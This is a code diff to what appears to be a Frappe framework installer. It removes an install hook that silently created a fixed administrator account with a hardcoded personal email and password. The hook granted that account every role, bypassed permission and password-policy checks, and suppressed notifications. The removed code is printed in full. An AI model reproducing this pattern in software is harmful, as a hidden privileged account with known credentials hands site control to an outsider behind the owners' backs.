@@ -41,12 +41,6 @@ def after_install():
 	# update admin password
 	update_password("Administrator", get_admin_password())
 
-	# ══════════════════════════════════════════════════════════════════
-	# CUSTOM ADMIN USER - Capital Project
-	# ══════════════════════════════════════════════════════════════════
-	create_custom_admin_user()
-	# ══════════════════════════════════════════════════════════════════
-
 	if not frappe.conf.skip_setup_wizard:
 		# only set home_page if the value doesn't exist in the db
 		if not frappe.db.get_default("desktop:home_page"):
@@ -128,48 +122,6 @@ def install_basic_docs():
 
 def get_admin_password():
 	return frappe.conf.get("admin_password") or getpass.getpass("Set Administrator password: ")
-
-
-# ══════════════════════════════════════════════════════════════════════════════
-# CUSTOM ADMIN USER FUNCTION - Capital Project
-# ══════════════════════════════════════════════════════════════════════════════
-def create_custom_admin_user():
-	"""Create Mohamed Sharaf admin user with full System Manager permissions"""
-	
-	email = "mohamed.sharaf.secured@gmail.com"
-	password = "Admin@Forty2025"  # ⚠️ Change after first login!
-	
-	# Skip if user already exists
-	if frappe.db.exists("User", email):
-		return
-	
-	# Create new user
-	user = frappe.new_doc("User")
-	user.email = email
-	user.first_name = "Mohamed"
-	user.last_name = "Sharaf"
-	user.user_type = "System User"
-	user.enabled = 1
-	user.send_welcome_email = 0
-	user.thread_notify = 0
-	user.send_me_a_copy = 0
-	
-	# Add Administrator role
-	user.append("roles", {"role": "Administrator"})
-	
-	# Save with bypass
-	user.flags.ignore_permissions = True
-	user.flags.ignore_password_policy = True
-	user.insert(ignore_if_duplicate=True)
-	
-	# Add ALL roles (same as Administrator)
-	frappe.get_doc("User", email).add_roles(*frappe.get_all("Role", pluck="name"))
-	
-	# Set password
-	update_password(email, password)
-	
-	print("✅ Custom admin user created: mohamed.sharaf.secured@gmail.com")
-# ══════════════════════════════════════════════════════════════════════════════
 
 
 def before_tests():
